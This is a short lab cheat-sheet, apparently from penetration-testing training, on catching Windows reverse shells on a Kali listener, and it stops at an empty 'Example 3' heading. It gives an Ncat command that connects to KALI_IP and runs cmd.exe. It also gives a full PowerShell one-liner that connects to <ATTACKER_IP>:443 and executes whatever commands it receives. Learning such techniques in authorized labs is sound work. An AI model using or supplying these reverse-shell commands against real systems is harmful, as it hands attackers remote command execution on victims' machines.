## Current operation: Receive a Windows Ncat command session

**Run in:** Windows cmd.exe. **Requires:** A Windows Ncat build supporting -e already on the lab host, a Kali ncat -lvnp 4444 listener and permitted outbound connectivity.

```console
ncat.exe KALI_IP 4444 -e cmd.exe
```

**Read the result:** Match platform, architecture, callback address and listener protocol, then verify the received process identity.

**If The listener receives a connection but no usable command prompt:** A TCP connection is not automatically a working shell; command quoting, process lifetime and egress can each break the chain.

**Next check:** Verify the selected executable and command processor, then run whoami and hostname; this stream does not provide a full Windows console.

### Example 2: 2. Windows PowerShell — connect back

Run in: **Windows PowerShell**. Replace &lt;ATTACKER_IP> with Kali’s reachable VPN address. Choose this OR the cmd.exe version below.

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Example 3: Alternative for Windows cmd.exe
